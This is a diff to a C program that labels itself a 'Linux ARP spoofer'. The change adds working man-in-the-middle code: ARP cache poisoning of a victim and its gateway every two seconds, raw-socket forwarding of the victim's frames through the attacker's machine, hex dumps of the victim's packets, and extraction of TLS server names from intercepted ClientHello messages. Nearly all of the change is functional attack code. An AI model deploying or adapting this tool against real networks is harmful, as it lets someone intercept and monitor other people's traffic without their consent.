@@ -10,7 +10,7 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <sys/types.h>
-#include <linux/if_arp.h> 
+#include <linux/if_arp.h>
 #include <linux/if_ether.h>
 
 #include <netinet/ip.h>
@@ -19,8 +19,8 @@
 #include <netinet/ip_icmp.h>
 
 /* get packet from kernel use raw socket */
-void get_tls_record(unsigned char* buffer, int size);
-
+void get_server_name(unsigned char *buffer, int size);
+void captureAndForward(const char* interfaceName, const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC);
 
 /* constant values */
 #define MAC_ADDR_LEN 0x06  /* MAC address length (48 bits) */
@@ -57,7 +57,8 @@ typedef struct{
     unsigned char tpa[IPv4_ADDR_LEN];   /* target protocol address */
 } arpheader_t;
 
-typedef struct __attribute__((packed)) {
+
+typedef struct __attribute__((packed)){
     uint8_t content_type;  // 0x16 for TLS handshake
     uint16_t version;
     uint16_t length;
@@ -112,8 +113,7 @@ int getIfIndex(const char* ifname, int* outIfIndex){
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
 
     /* getting interface index */
-    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == 0)
-    {
+    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == 0){
         /* copy index to output variable */
         *outIfIndex = ifr.ifr_ifindex;
         close(sockfd);
@@ -140,8 +140,7 @@ int getLocalMacAddress(const char* ifname, unsigned char* outMac){
     int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
 
     /* getting interface's hardware address */
-    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
-    {
+    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0){
         /* copy MAC address to output variable */
         memcpy(outMac, ifr.ifr_addr.sa_data, MAC_ADDR_LEN);
         close(sockfd);
@@ -290,6 +289,7 @@ int getMacAddress(const struct in_addr ip, unsigned char* outMac){
             }
         }
     }
+
     return -1;
 }
 
@@ -368,63 +368,140 @@ int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* des
         free(frame);
         return -1;
     }
+
     free(frame);
+
     return 0;
 }
 
 /* ARP cache poisoning infinite loop */
 void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC){
     pid_t pid = fork();
-    if (pid == 0){      // child process
+    if (pid == 0){      // clild process
         while (1){
             if (sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0){
-                printf("\nSend ARP reply to victim failed \n");
+                printf("Send ARP reply to victim failed \n");
             }
-            // else{
-            //     printf("\nSend ARP reply to victim \n");
-            // }
+            else{
+                printf("Send ARP reply to victim \n");              
+            }
 
             if (sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0){
                 printf("Send ARP reply to gateway failed \n ");
             }
-            // else{
-            //     printf("Send ARP reply to gateway \n");
-            // }
-            sleep(10);
+            else{
+                printf("Send ARP reply to gateway \n");
+            }
+            sleep(2);
         }
     }
-    else{       // parent process
-        int sockfd;
-        unsigned char buffer[MAX_PACKET_SIZE];
-        if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
-            perror("Socket creation failed.\n");
-            exit(1);
-        }
-        while (1){
-            socklen_t saddr_size = sizeof(struct sockaddr);
-            struct sockaddr saddr;
-            memset(&buffer, 0, MAX_PACKET_SIZE);
-
-            // Receive a packet
-            int data_size = recvfrom(sockfd, buffer, MAX_PACKET_SIZE, 0, &saddr, &saddr_size);
-
-            if (data_size == -1){
-                perror("Could not receive packet");
-                exit(1);
-            }
-            // extract_ethernet_frame(buffer, data_size);
-            get_tls_record(buffer, data_size);
-
-            // for(int i = 0; i < data_size; i++){
-            //     printf("%02X ", buffer[i]);
-            // }
-            // printf("\n\n\n");
-        }
+    else{   // parent process
+        captureAndForward(interfaceName, victimIP, victimMAC, gatewayIP, gatewayMAC);
     }
 }
 
-void get_tls_record(unsigned char* buffer, int size) {
-    // Skip the Ethernet, IP and TCP headers
+void captureAndForward(const char* interfaceName, const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC) {
+    int sockfd;
+    struct sockaddr_ll gatewayAddr, victimAddr;
+    unsigned char buffer[ETH_FRAME_LEN];
+
+    // Create socket to capture packets
+    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
+        perror("socket");
+        return;
+    }
+
+    struct ifreq ifr;
+    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));
+
+    // Bind socket to the interface
+    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0) {
+        perror("setsockopt");
+        close(sockfd);
+        return;
+    }
+
+    while (1) {
+        // Receive packet
+        ssize_t packetSize = recvfrom(sockfd, buffer, ETH_FRAME_LEN, 0, NULL, NULL);
+        
+        if (packetSize < 0) {
+            perror("recvfrom");
+            continue;
+        }
+        
+        // printf("Packet receive \n");
+        // for(int i = 0; i < packetSize; i++){
+        //     printf("%02x ", buffer[i]);
+        // }
+        // printf("\n\n\n");
+
+        // Check if the packet is from the victim
+        struct ether_header* ethHeader = (struct ether_header*)buffer;
+        if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0) {
+            // Modify the destination MAC address to the gateway's MAC address
+            
+            memset(&gatewayAddr, 0, sizeof(struct sockaddr_ll));
+            gatewayAddr.sll_family = AF_PACKET;
+            gatewayAddr.sll_protocol = htons(ETH_P_ALL);
+            gatewayAddr.sll_ifindex = ifr.ifr_ifindex;
+            memcpy(gatewayAddr.sll_addr, gatewayMAC, ETH_ALEN);
+            gatewayAddr.sll_halen = ETH_ALEN;
+
+            memcpy(ethHeader->ether_shost, localMAC, ETH_ALEN);
+            memcpy(ethHeader->ether_dhost, gatewayMAC, ETH_ALEN);
+
+            // Forward the packet to the gateway
+            if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&gatewayAddr, sizeof(struct sockaddr_ll)) < 0) {
+                perror("sendto");
+                continue;
+            }
+            
+            printf("Packet from victim\n");
+            for(int i = 0; i < packetSize; i++){
+                printf("%02x ", buffer[i]);
+            }
+            printf("\n\n\n");
+        }
+        
+        // Check packet from the gateway
+        else if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0){
+           
+
+            memset(&victimAddr, 0, sizeof(struct sockaddr_ll));
+            victimAddr.sll_family = AF_PACKET;
+            victimAddr.sll_protocol = htons(ETH_P_ALL);
+            victimAddr.sll_ifindex = ifr.ifr_ifindex;
+            memcpy(victimAddr.sll_addr, victimMAC, ETH_ALEN);
+            victimAddr.sll_halen = ETH_ALEN;
+
+            // Modify the source MAC address to the attacker's MAC address
+            memcpy(ethHeader->ether_shost, localMAC, ETH_ALEN);
+            memcpy(ethHeader->ether_dhost, victimMAC, ETH_ALEN);
+
+            // Forward the packet back to the victim
+            if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&victimAddr, sizeof(struct sockaddr_ll)) < 0) {
+                perror("sendto");
+                continue;
+            }            
+        }
+        else {
+            get_server_name(buffer, packetSize);
+
+            // printf("Packet of attacker\n");
+            // for (int i = 0; i < packetSize; i++){
+            //     printf("%02x ", buffer[i]);
+            // }
+            // printf("\n\n\n");
+        }
+          
+    }
+
+    close(sockfd);
+}
+
+void get_server_name(unsigned char *buffer, int size){
+    // Skip the Ethernet, Ip, TCP headers
     struct ethhdr * eth = (struct ethhdr *)(buffer);
     unsigned short ethhdrlen = sizeof(struct ethhdr);
     struct iphdr *iph = (struct iphdr *)(buffer + ethhdrlen);
@@ -434,37 +511,32 @@ void get_tls_record(unsigned char* buffer, int size) {
 
     // Check if the packet is long enough to contain a TLS record
     if (size < iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen) {
-        // printf("Packet is too short for a TLS record\n");
         return;
     }
 
-    // Get the TLS record
+    // Get the server name indication
     TLSRecord *tls = (TLSRecord*)(buffer + iphdrlen + tcphdrlen + ethhdrlen);
-    if(tls->content_type == 0x16){
-        // parse_client_hello(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen, size - iphdrlen - tcphdrlen - sizeof(TLSRecord) - ethhdrlen);
+    if (tls->content_type == 0x16){
         ClientHello *client_hello = (ClientHello*)(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen);
-        if (client_hello->handshake_type == 0x01){          
+        if (client_hello->handshake_type == 0x01) { // Client hello handshake type
             uint8_t *ptr = client_hello->extensions;
             uint8_t *end = client_hello->extensions + ntohs(client_hello->extensions_length);
             while (ptr < end){
                 Extension *ext = (Extension*)ptr;
-
-                if (ntohs(ext->extension_type) == 0x0000){
+                if (ntohs(ext->extension_type) == 0x0000){  // 0x0000: server name
                     ServerName *server_name = (ServerName*)ext->extension_data;
-                   
-                    printf("Server Name: ");
+                    printf("Server name: ");
                     for (int i = 0; i < ntohs(server_name->server_name_length); i++){
                         printf("%c", server_name->server_name[i]);
                     }
                     printf("\n");
                 }
-
-                ptr += ntohs(ext->extension_length) + 4;                   
+                ptr += ntohs(ext->extension_length) + 4;
             }
-            
         }
     }
 }
+
 
 
 int main(int argc, char* argv[]){
@@ -474,12 +546,14 @@ int main(int argc, char* argv[]){
     }
 
     if (argc < 4){
-        printf("usage: sudo %s <iface name> <vitcim's IP> <gateway's IP>", argv[0]);
+        printf("usage: sudo %s <iface name> <victim's IP> <gateway's IP>", argv[0]);
         return 0;
     }
 
     printf("Linux ARP spoofer\n-----------------\n");
+
     strcpy(interfaceName, argv[1]);
+
     printf("Looking for MAC addresses...\n");
 
     if(getLocalMacAddress(interfaceName, localMAC) == -1){
